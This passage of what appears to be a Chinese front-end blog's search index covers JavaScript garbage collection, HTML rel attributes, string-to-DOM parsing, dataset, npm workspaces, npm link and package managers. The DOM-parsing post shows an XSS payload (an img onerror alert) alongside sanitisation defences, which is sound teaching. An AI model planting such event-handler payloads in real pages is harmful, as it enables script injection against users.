oa 引用，所以还不能回收 oa = null; // a 属性的那个对象现在也是零引用了 // 它可以被垃圾回收了 限制-循环引用 该算法当循环引用时，会有限制。在下面的例子中，两个对象被创建，并互相引用，形成了一个循环。它们被调用之后会离开函数作用域，所以它们已经没有用了，可以被回收了。然而，引用计数算法考虑到它们互相都有至少一次引用，所以它们不会被回收。循环引用是内存泄漏的常见原因。现在已经没有引擎使用引用计数进行垃圾回收了。 function f() { const x = {}; const y = {}; x.a = y; // x references y y.a = x; // y references x return 'azerty'; } f(); 实际例子 IE 6, 7 使用引用计数方式对 DOM 对象进行垃圾回收。该方式常常造成对象被循环引用时内存发生泄漏： let div; window.onload = function(){ div = document.getElementById(&quot;myDivElement&quot;); div.circularReference = div; div.lotsOfData = new Array(10000).join(&quot;*&quot;); }; 在上面的例子里，myDivElement 这个 DOM 元素里的 circularReference 属性引用了 myDivElement，造成了循环引用。如果该属性没有显示移除或者设为 null，引用计数式垃圾回收器将总是且至少有一个引用，并将一直保持在内存里的 DOM 元素，即使其从 DOM 树中删去了。如果这个 DOM 元素拥有大量的数据 (如上的 lotsOfData 属性)，而这个数据占用的内存将永远不会被释放。 标记 - 清除算法 该算法将“对象是否不再需要”简化定义为“对象是否可以访问”。 这个算法假定设置一个叫做根（root）的对象（在 Javascript 里，根是全局对象）。垃圾回收器将定期从根开始，找所有从根开始引用的对象，然后找这些对象引用的对象...，垃圾回收器将找到所有可以获得的对象和回收所有不能获得的对象。 该算法是对前一个算法的改进，因为具有零引用的对象实际上是无法访问的。正如我们在循环引用中看到的那样，相反的情况并不成立。 从 2012 年起，所有现代浏览器都使用了标记 - 清除垃圾回收算法。过去几年在 JavaScript 垃圾回收（分代/增量/并发/并行垃圾回收）领域所做的所有改进都是对该算法的实现改进，但并没有改进标记 - 清除算法本身和它对“对象是否不再需要”的简化定义。 循环引用不再是问题了 在上面的循环引用示例中，函数调用返回之后，两个对象从全局对象出发无法获取。因此，他们将会被垃圾回收器回收。第二个示例同样，一旦 div 和其事件处理无法从根获取到，他们将会被垃圾回收器回收。 限制：那些无法从根对象查询到的对象都将被清除 尽管这是一个限制，但实践中我们很少会碰到类似的情况，所以开发者不太会去关心垃圾回收机制。 限制：手动释放内存 有时手动决定何时以及释放什么内存会很方便。为了释放一个对象的内存，它需要显式地变得不可访问。 截至目前，无法在 JavaScript 中显式或以编程方式触发垃圾收集。 Node.js Node.js 提供了额外的选项和工具来配置和调试在浏览器环境中无法使用的 JavaScript 内存管理。 例如，可以使用标志增加可用堆内存的最大数量： node --max-old-space-size=6000 index.js ","link":"https://zkrisj.github.io/post/javascript-de-nei-cun-guan-li/"},{"title":"HTML rel 属性的使用","content":"介绍 通过 &lt;a&gt;, &lt;area&gt;、&lt;form&gt; 或 &lt;link&gt; 元素可以使一个页面链接到另一个页面，通过 href 属性（&lt;form&gt; 属性是 action）可以设置外部资源的路径。 rel 属性表示 “关系 (relationship) ”，在 &lt;link&gt;、&lt;a&gt;、&lt;area&gt; 和 &lt;form&gt; 元素上有效，属性值表示 &lt;link&gt; 的链接方式或与包含它的文档之间的关系。 支持的类型 alternate 在 &lt;link&gt;、&lt;a&gt;、&lt;area&gt; 元素上有效。 如果元素是 &lt;link&gt; 并且 rel 属性也包含 stylesheet 类型，则链接定义替代样式表；在这种情况下，title 属性必须存在。 &lt;link href=&quot;reset.css&quot; rel=&quot;stylesheet&quot;&gt; &lt;link href=&quot;default.css&quot; rel=&quot;stylesheet&quot; title=&quot;默认&quot;&gt; &lt;link href=&quot;red.css&quot; rel=&quot;alternate stylesheet&quot; title=&quot;红色&quot;&gt; &lt;link href=&quot;green.css&quot; rel=&quot;alternate stylesheet&quot; title=&quot;绿色&quot;&gt; 上面4个 &lt;link&gt; 元素，共定义了 3 种不同性质的 CSS 样式文件加载： 没有 title 属性，rel 属性值仅仅是 stylesheet 的 &lt;link&gt; 无论如何都会加载并渲染，如 reset.css； 有 title 属性，rel 属性值仅仅是 stylesheet 的 &lt;link&gt; 作为默认样式 CSS 文件加载并渲染，如 default.css； 有 title 属性，rel 属性值同时包含 alternate 和 stylesheet 的 &lt;link&gt; 作为备选样式 CSS 文件加载，默认不渲染，如 red.css 和 green.css。 在 IE 和 Firefox 中可以通过菜单切换样式： 而在 Chrome 中则需要手动添加 JS 切换： // 渲染red.css这个皮肤 document.querySelector('link[href=&quot;red.css&quot;]').disabled = false; 用来增强链接语义的类型 archives、author、glossary、help、first、last、prev、next、index、contents、chapter、section、subsection、appendix、license 在 &lt;link&gt;、&lt;a&gt;、&lt;area&gt; 元素上有效，表明这个链接指向归档、作者信息介绍页面、使用的词汇的术语表页面、与上下文相关的帮助页面或资源、一系列链接中的第一个页面、最后一个页面、上一个页面、下一个页面、根页面、文档的目录、章、节、小节、附录、版权说明页面；bookmark，external、nofollow 在 &lt;a&gt;、&lt;area&gt; 元素上有效，表明这是一个固定链接、外部链接（点击这个链接会离开当前网站）、搜索引擎无需抓取的链接。 canonical 在 &lt;link&gt; 元素上有效，定义当前文档的首选 URL，这对搜索引擎很有用，可以为类似网页或重复网页指定规范网页。例如 wordpress 文章链接地址有多种 URL 表示，我希望用户通过 https://www.zhangxinxu.com/wordpress/2019/05/html-a-rel/（而非 https://www.zhangxinxu.com/wordpress/?p=8488）访问这篇文章，则可以新增如下代码： &lt;link rel=&quot;canonical&quot; href=&quot;https://www.zhangxinxu.com/wordpress/2019/05/html-a-rel/&quot;&gt; dns-prefetchExperimenta 在 &lt;link&gt; 元素上有效，提示浏览器该资源需要在用户点击链接之前进行 DNS 查询和协议握手。例如： &lt;link rel=&quot;dns-prefetch&quot; href=&quot;http://www.zhangxinxu.com/&quot;&gt; 此时如果页面中有链接地址的域名也是 www.zhangxinxu.com，那么当用户点击这个链接的时候，新打开的页面就少了 DNS 向上查找这一步，因为之前浏览器已经 DNS 预读取了，页面呈现速度就会快一些。 icon 同义词 shortcut，在 &lt;link&gt; 元素上有效，指定网站标题栏小图标。例如： &lt;link rel=&quot;icon&quot; href=&quot;favicon.ico&quot;&gt; manifest 在 &lt;link&gt; 元素上有效，表示链接到的文件是 Web App Manifest，一个 JSON 文本文件，在其中提供有关 PWA 应用程序的信息（如名称，作者，图标和描述）。 modulepreload 预加载原生模块脚本。浏览器已经原生支持 JavaScript 模块，包括静态和动态导入支持。这意味着现在可以编写在浏览器中本地运行的基于模块的 JavaScript，而无需转译器或捆绑器。但是，模块依赖引入了一个加载问题，因为浏览器需要等待一个模块加载，然后才能发现它的依赖是什么。解决此问题的一种方法是预加载依赖项，以便浏览器提前了解所有依赖文件。modulepreload 即是 preload 的 JavaScript 模块版本，它解决了后者的许多问题。 &lt;link rel=&quot;modulepreload&quot; href=&quot;./1.mjs&quot;&gt; &lt;script src=&quot;./1.mjs&quot; type=&quot;module&quot;&gt;&lt;/script&gt; Chrome 现在知道您要预加载的是一个模块，因此它可以很智能，并在完成获取后立即解析和编译模块，而不是等到它尝试运行。 模块的依赖关系呢？ 以递归方式预加载依赖项，但需要浏览器需要具有强大的模块重复数据删除功能。通常最佳实践是声明模块及其依赖项的扁平列表。 &lt;!-- dog.js 依赖 dog-head.js, dog-head.js 依赖 dog-head-mouth.js, dog-head-mouth.js 依赖 dog-head-mouth-tongue.js. --&gt; &lt;link rel=&quot;modulepreload&quot; href=&quot;dog-head-mouth-tongue.mjs&quot;&gt; &lt;link rel=&quot;modulepreload&quot; href=&quot;dog-head-mouth.mjs&quot;&gt; &lt;link rel=&quot;modulepreload&quot; href=&quot;dog-head.mjs&quot;&gt; &lt;link rel=&quot;modulepreload&quot; href=&quot;dog.mjs&quot;&gt; 预加载模块是否有助于提高性能？ 预加载可以帮助最大化带宽使用，通过告诉浏览器它需要获取什么，这样它就不会在那些漫长的往返过程中无事可做。如果您正在尝试使用模块并由于深度依赖树而遇到性能问题，那么创建一个扁平的预加载列表肯定会有所帮助。 noopener 在 &lt;a&gt;、&lt;area&gt;、&lt;form&gt; 元素上有效，在打开不受信任的链接时确保它们不能通过 window.opener 属性篡改原始文档。目前除了 IE 都已默认。与 window.open(url, 'OpenNewWindow', 'noopener') 功能相同。 opener 在 &lt;a&gt;、&lt;area&gt;、&lt;form&gt; 元素上有效，在打开链接时恢复对 window.opener 属性的引用。 noreferrer 在 &lt;a&gt;、&lt;area&gt;、&lt;form&gt; 元素上有效，阻止浏览器导航到另一个页面时，通过 Referer：HTTP header 请求头将该页面地址或任何其他值作为 Referrer 发送。与 window.open(url, 'OpenNewWindow', 'noreferrer') 功能相同。 preconnect 在 &lt;link&gt; 元素上有效，表示预连接，作用是告知浏览器提前连接链接地址对应站点，不过只是连接，并不会公开任何私人信息或者下载任何内容。好处是打开链接内容的时候可以更快的获取（节约了 DNS 查询、重定向以及指向处理用户请求的最终服务器的若干往返）。 prefetch 在 &lt;link&gt; 元素上有效，表示预获取将在下一次导航/页面加载中使用的资源，例如搜索结果列表中首个产品的详情页面或搜索分页内容的下一页，prefetch 获取页面并不会加载页面中的 css 和 js 资源，而是加载页面本身。prefetch 比 preload 的优先级低——因为当前页面比下一个页面更重要。 preload 在 &lt;link&gt; 元素上有效，表示预加载，通常是一些静态资源（字体、图片、样式或脚本），因为这些资源通常隐藏在 CSS 文件中，有时甚至有好几级。在这种情况下，浏览器必须等待多次往返才能发现它需要获取一个大字体文件，而它本可以利用这段时间开始下载并利用完整的连接带宽。 preload 及其等效的 HTTP 标头提供了一种简单的声明性方式，在浏览器需要资源之前提前声明式请求资源。当浏览器遇到 preload 时，它就会开始为资源进行高优先级下载，因此在实际需要它时它已经被获取或部分存在。 需要同时设置 as 属性中的资源类型（这是内容安全策略和设置正确的 Accept 请求标头所必需的）来指定要预加载的内容类型，这样可以使浏览器： 更准确地优先加载资源。 存储在缓存中以供将来的请求使用，并在适当的情况下重用资源。 将正确的内容安全策略应用于资源。 为其设置正确的 Accept 请求标头。 &lt;link rel=&quot;preload&quot; href=&quot;style.css&quot; as=&quot;style&quot;&gt; &lt;link rel=&quot;preload&quot; href=&quot;main.js&quot; as=&quot;script&quot;&gt; 可以预加载许多不同的内容类型，可能的 as 属性值是： audio：音频文件，通常用于 &lt;audio&gt;。 document: 由 &lt;frame&gt; 或 &lt;iframe&gt; 嵌入的 HTML 文档。 embed：要嵌入到 &lt;embed&gt; 元素中的资源。 fetch：要通过 fetch 或 XHR 请求访问的资源，例如 ArrayBuffer 或 JSON 文件。 font: CSS @font-face 字体文件。 image： 图像文件。 object：要嵌入到 &lt;object&gt; 元素中的资源。 script: JavaScript 文件。 style: CSS 样式表。 track: WebVTT 文件。 worker：一个 web worker 或 shared worker。 video：视频文件，通常用于 &lt;video&gt;。 还可以同时指定一个 type 属性，该属性包含元素指向的资源的 MIME 类型。这在预加载资源时特别有用——浏览器将使用 type 属性值来确定它是否支持该资源，如果支持则会下载它，如果不支持则忽略它，这样可以在浏览器不支持的情况下不必要地预加载它。 prerender 在 &lt;link&gt; 元素上有效，表示预渲染，在后台呈现指定的网页，如果用户导航到该网页，则可以加快其加载速度。 由于可能浪费用户带宽，Chrome 使用 NoState Prefetch 替代 prerender——它和 prerender 一样提前获取资源；但它不会执行 JavaScript 或提前渲染页面的任何部分。NoState Prefetch 的目标是使用比预渲染更少的内存，同时仍然减少页面加载时间。 shortlink 在 &lt;link&gt; 元素上有效，给出当前页面对应的短链接，这样分享链接的时候要更容易。 stylesheet 最常用，在 &lt;link&gt; 元素上有效，定义要用作样式表的外部资源。 tag 在 &lt;a&gt;、&lt;area&gt; 元素上有效，定义适用于当前文档的标签的链接，这样 SEO 会更加精准，质量更高。 参考资料 HTML rel属性值释义大全 ","link":"https://zkrisj.github.io/post/html-rel-shu-xing-de-shi-yong/"},{"title":"字符串转 DOM 的几种方法和安全措施","content":"介绍 有时我们想得到现有的 DOM 树序列化后的字符串，如果仅仅想得到指定节点的后代，可以直接用 Element.innerHTML 属性；如果你想得到包括节点本身及它所有的后代的话，可以使用 Element.outerHTML 属性。 如果将字符串内容解析为 DOM 树，则有几种方法。 字符串转 DOM innerHTML function parse(html) { const placeholder = document.createElement(&quot;div&quot;); placeholder.innerHTML = html; return placeholder; } 安全：没有脚本执行 允许的节点：只有有效的节点 insertAdjacentHTML function parse(html) { const placeholder = document.createElement(&quot;div&quot;); placeholder.insertAdjacentHTML(&quot;afterbegin&quot;, html); return placeholder; } 安全：没有脚本执行 允许的节点：只有有效的节点 DOMParser function parse(html) { const doc = new DOMParser().parseFromString(html, &quot;text/html&quot;); return doc.body.childNodes; } 安全：没有脚本执行 允许的节点：只有有效的节点 createContextualFragment function parse(html) { const fragment = document.createRange().createContextualFragment(html); return fragment.childNodes; } 安全：会执行脚本 允许的节点：可以设置上下文允许的节点 脚本执行 除了 createContextualFragment 之外，所有方法都会阻止常规脚本执行。例如： const name = &quot;&lt;script&gt;alert('I am John in an annoying alert!')&lt;/script&gt;&quot;; el.innerHTML = name; // harmless in this case 这并不会导致 XSS 攻击，因为在 HTML5 中不会执行由 innerHTML 插入的 script 脚本。 但是，有很多不依赖 script 标签去执行 JavaScript 的方式。例如： const name = &quot;&lt;img src='x' onerror='alert(1)'&gt;&quot;; el.innerHTML = name; // shows the alert 上面的代码在浏览器中会执行 alert(1)，其他类似的属性还有 onload，例如上面代码 onerror 换成 onload，src 改成正常的 URL 地址，在在浏览器中同样会执行。通过几种措施可以阻止这些情况： 可以在将实际节点附加到 DOM 之前去除子节点的所有违规属性： [...placeholder.querySelectorAll(&quot;*&quot;)].forEach((node) =&gt; node.removeAttribute(&quot;onerror&quot;); ); 当插入纯文本时，建议使用 Node.textContent 代替 Element.innerHTML，它不会把给定的内容解析为 HTML，它仅仅是将原始文本插入给定的位置。 使用 Element.setHTML() 代替 Element.innerHTML，这是浏览器的一个最新方法，可以删除 HTML 字符串中在当前元素的上下文中任何不安全或无效的元素、属性或注释。 const unsanitized_string = '&lt;img src=&quot;x&quot; onerror=&quot;console.log(1)&quot;&gt;'; el.setHTML(unsanitized_string); console.log(el.innerHTML); // &lt;img src=&quot;x&quot;&gt; 使用 Sanitizer.sanitizeFor() 代替 Document.createElement() 创建新节点。该方法接收一个 HTML 标记名称，例如 div、table、p 等，和一个 HTML 字符串参数。返回一个解析和清理后的与参数中指定的标记相对应的 HTML 元素。 const unsanitized_string = '&lt;img src=&quot;x&quot; onerror=&quot;console.log(1)&quot;&gt;'; const p = new Sanitizer().sanitizeFor('p', unsanitized_string); console.log(p.innerHTML); // &lt;img src=&quot;x&quot;&gt; html 限制 HTML 中有一些限制会阻止将某些类型的节点添加到像 div 这样的节点，例如 thead、tbody、tr 和 td。 const placeholder = document.createElement(&quot;div&quot;); placeholder.innerHTML = `&lt;tr&gt;&lt;td&gt;Foo&lt;/td&gt;&lt;/tr&gt;`; const node = placeholder.firstElementChild; //=&gt; null 但可以通过几种方法来避免这种情况： 通过 createContextualFragment 设置上下文： const table = document.createElement(`table`); const tbody = document.createElement(`tbody`); table.appendChild(tbody); const range = document.createRange(); range.selectNodeContents(tbody); const node = range.createContextualFragment(`&lt;tr&gt;&lt;td&gt;Foo&lt;/td&gt;&lt;/tr&gt;`); node.firstChild //=&gt; tr 使用模板标签作为占位符，它没有任何内容限制： const template = document.createElement(&quot;template&quot;); template.innerHTML = `&lt;tr&gt;&lt;td&gt;Foo&lt;/td&gt;&lt;/tr&gt;`; const node = template.content; node.firstChild //=&gt; tr 创建临时节点： const tr=document.createElement('tr'); tr.innerHTML = `&lt;tr&gt;&lt;td&gt;Foo&lt;/td&gt;&lt;/tr&gt;`; const placeholder = document.createElement(&quot;table&quot;); placeholder.appendChild(tr); placeholder.firstChild //=&gt; tr 使用文档片段： const tr=document.createElement('tr'); tr.innerHTML = `&lt;tr&gt;&lt;td&gt;Foo&lt;/td&gt;&lt;/tr&gt;`; const fragment = new DocumentFragment(); fragment.appendChild(tr); fragment.firstChild //=&gt; tr 参考资料： 从 HTML 字符串创建 DOM 节点 盘点HTML字符串转DOM的各种方法及细节 ","link":"https://zkrisj.github.io/post/zi-fu-chuan-zhuan-dom-de-ji-chong-fang-fa/"},{"title":"HTML5 dataset 的使用","content":"介绍 HTML5 是具有扩展性的设计，它初衷是数据应与特定的元素相关联，但不需要任何定义。 data-* 全局属性是一类被称为自定义数据属性的属性，它赋予我们在所有 HTML 元素上嵌入自定义数据属性的能力，并可以通过脚本在 HTML 与 DOM 表现之间进行专有数据的交换。通过添加 data-* 属性，即使是普通的 HTML 元素也能变成相当复杂且强大的编程对象，而不需要使用 DOM 标准额外属性或是 setUserData 之类的技巧。 其中 * 可以被遵循 xml 规则的任何名称替换，并具有一些限制： 不能以 xml 开头（不区分大小写）； 不能包含冒号 :； 不能包含大写字母。 使用 CSS 访问：因为 data-* 设定为 HTML 属性，所以他们同样能被 CSS 访问。比如你可以通过 CSS content 属性，使用 attr 函数来显示 data-* 的内容： &lt;ul&gt; &lt;li data-id=&quot;Alex Trevelyan&quot;&gt;006: Agent turned terrorist leader; James' nemesis in &quot;Goldeneye&quot;.&lt;/li&gt; &lt;li data-id=&quot;James Bond&quot;&gt;007: The main man; shaken but not stirred.&lt;/li&gt; &lt;/ul&gt; li:after { content: 'Data ID: 'attr(data-id); position: absolute; top: -22px; left: 10px; background: black; color: white; padding: 2px; border: 1px solid #eee; opacity: 0; transition: 0.5s opacity; } li:hover:after { opacity: 1; } JavaScript 访问：在外部使用 JavaScript 去访问这些属性的值同样非常简单。你可以使用 Element.getAttribute() 配合它们完整的 HTML 名称去读取它们。但标准定义了一个更简单的方法：通过 HTMLElement.dataset.propertyName (或者 HTMLElement.dataset[&quot;propertyName&quot;]) 来获取属性名中 data- 之后的部分，要注意的是破折号连接的名称需要改写为骆驼拼写法，例如 data-index-number 转换为 indexNumber。 &lt;article id=&quot;electriccars&quot; data-columns=&quot;3&quot; data-index-number=&quot;12314&quot; data-parent=&quot;cars&quot;&gt; ... &lt;/article&gt; const article = document.querySelector('#electriccars'); article.dataset.columns // &quot;3&quot; article.dataset.indexNumber // &quot;12314&quot; article.dataset.parent // &quot;cars&quot; 示例 ","link":"https://zkrisj.github.io/post/html5-dataset-de-shi-yong/"},{"title":"npm workspaces 的使用","content":"介绍 本地化开发 npm package 不可能每次改了代码，都发布到 npm 官网，所以 npm 提供给我们 npm link 命令用来进行本地化开发。使用 npm-link 调试代码，我们要开两个编辑器，一个编辑器改开发 package 的代码，另一个编辑器用来调试。 如果我们开发组件库几十个组件，难道要开几十个窗口吗？npm 的新特性 workspaces 可以帮助我们来进行多包管理，它可以让多个 npm 包在同一个项目中进行开发和管理变得非常方便： 它会将子包中所有的依赖包都提升到根目录中进行安装，提升包安装的速度； 它初始化后会自动将子包之间的依赖进行关联（软链接）； 因为同一个项目的关系，从而可以让各个子包共享一些流程，比如：eslint、stylelint、git hooks、publish flow 等； workspaces 是一个用来在本地项目下面管理多个包的 npm 功能。（yarn 很早就支持了，npm 在 7.x 中开始支持，也就是 Node@15.0.0 新增的功能）。 这个功能让我们在本地开发包，尤其是多个互相依赖的包时，避免手动的去执行 npm link 命令，而是在 npm install 的时候，会自动把 workspaces 下面的合法包，自动创建符号链接到当前的 node_modules 文件夹里。 使用 配置在 package.json 中的 workspaces 字段 workspaces 字段接收一个数组，数组里面可以填写相对根目录的文件夹名称或者是通配符，在 npm install 期间自动符号链接的这些包称为单个工作区。在以下示例中，位于文件夹 ./packages 内的所有文件夹都将被视为工作区，只要它们包含有效的 package.json 文件即可： { &quot;name&quot;: &quot;workspace-example&quot;, &quot;workspaces&quot;: [ &quot;./packages/*&quot; ] } 运行 npm install，./packages 内的所有包都将创建符号链接到当前目录的 node_modules 文件夹里，对于包的使用和查找，和正常安装的 npm 包相同。 使用 npm init 自动执行定义新工作区 例如，在已经定义了 package.json 的项目中运行： npm init -w ./packages/a -y 如果不存在文件夹 ./packages/a，此命令将创建文件夹 ./packages/a 和 ./packages/a/package.json 文件。同时，在当前目录的 package.json 中添加 workspaces 字段，和值 [&quot;packages\\\\a&quot;]。 也可以一次添加多个工作区： npm init -w packages/a -w packages/b -y 添加依赖到工作区 可以直接在工作区，进行安装、更新和删除依赖。例如，有下面的包结构： . +-- package.json `-- packages +-- a | `-- package.json `-- b `-- package.json 如果要从 npm 库中添加一个名为 abbrev 的依赖到工作区 a，可以使用以下命令告诉 npm 安装程序应该将包添加为工作区 a 的依赖项： npm install abbrev -w a 如果要卸载 abbrev 的依赖，则要使用以下命令： npm uninstall abbrev -w a 其他的 npm 命令也同样适用于工作区。 在工作区中运行命令 假如，当前项目中已经存在工作区 a 和 b，可以在指定的工作区 a 中运行以下 npm 命令： npm run test --workspace=a 这相当于以下步骤： cd packages/a &amp;&amp; npm run test 也可以指定多个参数： npm run test --workspace=a --workspace=b 或者在所有配置的工作区中运行该命令，将按照它们在 package.json 中出现的顺序在每个工作区中运行： npm run test --workspaces 如果使 npm 忽略缺少目标脚本的工作区，可以加上 --if-present 标志。 npm run test --workspaces --if-present 单独部署 只安装工作区 a 中的依赖包并运行： npm install --production --workspace=a npm run prod --workspace=a 示例 假如，当前项目中已经存在工作区 a： . +-- node_modules | `-- a -&gt; ../packages/a +-- package-lock.json +-- package.json `-- packages +-- a | `-- package.json 在工作区 a 中新建 index.js 文件，并加入以下内容： module.exports = 'a' 在当前目录下，新建 lib 目录和 index.js 文件，并加入以下内容： const moduleA = require('a') console.log(moduleA) // -&gt; a 然后运行 node lib/index.js，可以看到工作区和正常安装的 npm 包使用并无差别。我们可以轻松地发布这些嵌套的工作空间以在其他地方使用。 和 monorepo 配合使用 如果维护一个单体仓库太过庞大了，维护多个仓库又太过繁琐，monorepo 的理念是维护一个仓库，但是一个仓库划分为多个 package。 方式一： 各个子项目都集合到一个项目中来，package.json 只有一份在根目录，所有项目中的 npm 包都安装到根目录，在根目录的 package.json 中定义开发和部署子项目的命令。 缺点： 命令混乱； 无法应对子项目之间存在 npm 包冲突的问题；（比如，A 项目想用 webpack4，B 项目想用 webpack5） 方式二： 各个子项目都集合到一个项目中来，根目录和各个子包都各自有一份 package.json，但基础的构建工具在根目录进行安装，比如上面提到的 webpack、webpack-cli、webpack-dev-server、html-webpack-plugin、webpack-merge，全都在根目录进行安装，和业务相关的 npm 包都安装到各自子项目中。 缺点： 如果子项目中有依赖相同的包，不得不在各个子项目中重复安装； 同样无法应对子项目之间存在 npm 包冲突的问题； 如果某天想把 B 项目移除，成本很高； 方式三： 各个子项目都集合到一个项目中来，各个子包都各自有一份 package.json，根目录无 package.json。 缺点： 同样如果子项目中有依赖相同的包，不得不在各个子项目中重复安装； 使用 workspaces 就可以很好的解决了上面的所有问题！ 其他应用 对于已经存在的项目而言，比如一个是 Web 的，一个是 H5 的，他们属于同一个业务，所以有大量的代码可以复用，又因为只涉及这两个项目而已，把公共代码做成 npm 包又有点太杀鸡用牛刀，而采用复制、粘贴的方式又显然是非常低效的，这时可以使用 workspaces 将它们合并成一个项目。 mock 服务也是个子项目单独一套，但是大多数接口的数据都是可以公用的，只是 url 前缀不同。这样就可以使用 workspaces 将它们合并成一个项目，这是对原项目改动量最小的方案。 ","link":"https://zkrisj.github.io/post/npm-workspaces-de-shi-yong/"},{"title":"npm link 的使用","content":"介绍 npm install 可以把发布在 npmjs 平台上的模块包下载到本地，npm install -g 可以把包下下来的同时，还帮我们配置好全局变量，让我们可以直接使用命令而不是通过 node 来执行或者配置 package.json 的 scripts 脚本来 run。 但这仅限于已经发布的包，对于未发布的包，要怎么测试使用？ 我们独立开发好这个依赖包，然后将它直接发布到 npm 镜像站上去，以后在其他项目中使用的时候，直接 npm install moduleName。 npm 另外也给我们提供了测试本地的包的工具指令：npm link。 npm link 是一个命令行工具，用于在开发过程中将本地包符号链接为依赖项。它通常用于在发布之前测试包。 原理 当我们在 npm install -g 的时候，其实是将相关文件安装在/usr/local/lib/node_modules 目录（Windows 目录为 node 安装目录，可以使用 npm root -g 命令查看）下，同时在全局命令 /usr/local/bin 目录下会有一个映射脚本，将其指向 /usr/local/lib 下的真实文件。这么做的好处是，可以在保证只有一份可执行文件的前提下，给命令取别名。 npm link 做的事情也是一样，唯一的区别是，它在 /usr/local/lib 下的 node_modules 里不是存的真实的文件，而是存了一个快捷方式，指向你当前执行 npm link 的目录。如果开发的的是 node 包，则执行的命令名和真实执行的文件入口，会根据项目的 package.json 里 main 的配置来获取。 npm link 可以帮助我们模拟包安装后的状态，它会在系统中做一个快捷方式映射，让本地的包就好像 install 过一样，可以直接使用。 使用 进入需要测试的 my-library 目录（package.json 的 name 属性为 my-library），执行 npm link 命令。在全局环境下，也就是 nodejs 安装目录下的 node_modules 目录下，会生成一个符号链接文件，在 windows 下就是一个快捷方式。 进入需要引入 my-library 模块的目录，将 my-library 模块与此项目连接起来，执行 npm link my-library 就可以完成它们的连接。 当项目和模块在同一个目录下，可以使用相对路径 npm link ../my-library，不需要在 my-library 目录执行 npm link。 使用 npm 中的模块，也可以使用 npm link 命令，比如我们的很多应用都会用到 node-fetch 模块。可以先将 node-fetch 安装到全局模式下：npm install node-fetch -g。然后在每一个要使用 node-fetch 的项目中使用 npm link node-fetch，就可以将 node-fetch 链接到项目的 node_modules 下了。当 npm update node-fetch -g 更新时，所有 link 的项目会同时更新了。 解除 npm unlink 其实是 npm uninstall 的别名。 在使用 npm 包的项目的文件目录下解除链接： npm unlink my-library 去除全局链接： npm unlink my-library -g ","link":"https://zkrisj.github.io/post/npm-link-de-shi-yong/"},{"title":"npm yarn yarn2 pnpm 几种包管理对比","content":"npm 2010 年 1 月诞生，NodeJS 的默认包管理工具。 问题 依赖地狱（Dependency Hell）：npm v3 之前采用嵌套的 node_modules 结构，直接依赖会平铺在 node_modules 下，子依赖嵌套在直接依赖的 node_modules 中。例如项目依赖了A 和 C，而 A 和 C 依赖了不同版本的 B@1.0 和 B@2.0，node_modules 结构如下： node_modules ├── A@1.0.0 │ └── node_modules │ └── B@1.0.0 ├── C@1.0.0 │ └── node_modules │ └── B@2.0.0 └── D@1.0.0 └── node_modules └── B@1.0.0 扁平的 node_modules 结构：为了将嵌套的依赖尽量打平，避免过深的依赖树和包冗余，npm v3 将子依赖「提升」（hoist），采用扁平的 node_modules 结构，子依赖会尽量平铺安装在主依赖项所在的目录中。 node_modules ├── A@1.0.0 ├── B@1.0.0 └── C@1.0.0 └── node_modules └── B@2.0.0 └── D@1.0.0 A 依赖的 B@1.0 不再放在 A 的 node_modules 下了，而是与 A 同层级。 而 C 依赖的 B@2.0 因为版本号原因还是嵌套在 C 的 node_modules 下。 这样不会造成大量包的重复安装，依赖的层级也不会太深，解决了依赖地狱问题。 幽灵依赖（Phantom dependencies）：指在 package.json 中未定义的依赖，但项目中依然可以正确地被引用到。 由于 B 在安装时被提升到了和 A 同样的层级，所以在项目中引用 B 还是能正常工作的。 幽灵依赖是由依赖的声明丢失造成的，如果某天某个版本的 A 依赖不再依赖 B 或者 B 的版本发生了变化，就会造成依赖缺失或兼容性问题。 不确定性（Non-Determinism）：指同样的 package.json 文件，install 依赖后可能不会得到同样的 node_modules 目录结构。 A 依赖 B@1.0，C 依赖 B@2.0，依赖安装后应该提升 B 的 1.0 还是 2.0 取决于用户的安装顺序。 如果有 package.json 变更，本地需要删除 node_modules 重新 install，否则可能会导致生产环境与开发环境 node_modules 结构不同，代码无法正常运行。 依赖分身（Doppelgangers）：假设继续再安装依赖 @B2.0 的 E 模块，此时 B@2.0 会被安装两次，无论提升 B@1.0 还是 B@2.0，都会存在重复版本的 B 被安装，这两个重复安装的 B 就叫依赖分身。虽然看起来模块 C 和 E 都依赖 B@2.0，但其实引用的不是同一个 B，假设 B 在导出之前做了一些缓存或者副作用，那么使用者的项目就会因此而出错。node_modules ├── A@1.0.0 ├── B@1.0.0 ├── D@1.0.0 ├── C@1.0.0 │ └── node_modules │ └── B@2.0.0 └── E@1.0.0 └── node_modules └── B@2.0.0 yarn 2016 年发布，定义为快速、安全、可靠的依赖管理。 并行提升安装速度： 在 npm 中安装依赖时，安装任务是串行的，会按包顺序逐个执行安装，这意味着它会等待一个包完全安装，然后再继续下一个。 为了加快包安装速度，yarn 采用了并行操作，在性能上有显著的提高。 而且在缓存机制上，yarn 会将每个包缓存在磁盘上，在下一次安装这个包时，可以脱离网络实现从磁盘离线安装。 lockfile 解决不确定性： 在依赖安装时，会根据 package.josn 生成一份 yarn.lock 文件。 lockfile 里记录了依赖，以及依赖的子依赖，依赖的版本，获取地址与验证模块完整性的 hash。 即使是不同的安装顺序，相同的依赖关系在任何的环境和容器中，都能得到稳定的 node_modules 目录结构，保证了依赖安装的确定性。 而 npm 在一年后的 v5 才发布了 package-lock.json。 与 npm 一样的弊端：yarn 依然和 npm 一样是扁平化的 node_modules 结构，没有解决幽灵依赖和依赖分身问题。 yarn2 2020 年 1 月，yarn2 发布，也叫 yarn berry（v1 叫 yarn classic）。 对 yarn 的一次重大升级，其中一项重要更新就是 Plug'n'Play（Plug and Play = PnP，即插即用）。 抛弃 node_modules： 无论是 npm 还是 yarn，都具备缓存的功能，大多数情况下安装依赖时，其实是将缓存中的相关包复制到项目目录中 node_modules 里。 而 yarn PnP 则不会进行拷贝这一步，而是在项目里维护一张静态映射表 pnp.cjs。 pnp.cjs 会记录依赖在缓存中的具体位置，所有依赖都存在全局缓存中。同时自建了一个解析器，在依赖引用时，帮助 node 从全局缓存目录中发现依赖，而不是查找 node_modules。 这样就避免了大量的 I/O 操作同时项目目录也不会有 node_modules 目录生成，同版本的依赖在全局也只会有一份，依赖的安装速度和解析速度都有较大提升。 pnpm 在 2020 年底的 v5.9 也支持了 PnP。 脱离 node 生态： 因为使用 PnP 不会再有 node_modules 了，但是 Webpack，Babel 等各种前端工具都依赖 node_modules。虽然很多工具比如 pnp-webpack-plugin 已经在解决了，但难免会有兼容性风险。 PnP 